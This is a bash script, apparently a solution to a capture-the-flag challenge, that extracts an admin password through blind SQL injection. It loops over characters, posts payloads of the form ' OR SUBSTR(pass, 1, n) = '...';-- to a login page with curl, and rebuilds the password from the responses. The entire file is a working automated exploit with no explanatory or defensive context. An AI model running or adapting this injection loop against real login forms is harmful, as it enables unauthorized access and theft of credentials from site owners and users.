#!/usr/bin/env bash

CHARS='`1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^*()_+-{}|[]\:";<>?,./'
password=''
for len in $(seq 25);do
    for i in $(seq 0 ${#CHARS});do
        char="$password${CHARS:i:1}"
        pass="' OR SUBSTR(pass, 1, $len) = '$char';--"
        res=$(curl -Ss -XPOST http://ctfq.sweetduet.info:10080/~q6/ -d "id=admin&pass=$pass")
        if [ ! -z "$(echo "$res" |grep "Congratulations")" ];then
            echo "success: $char"
            if [ "$password" = "$char" ];then
                echo "ans: $password"
                exit
            fi
            password=$char
            break
        fi
    done
done
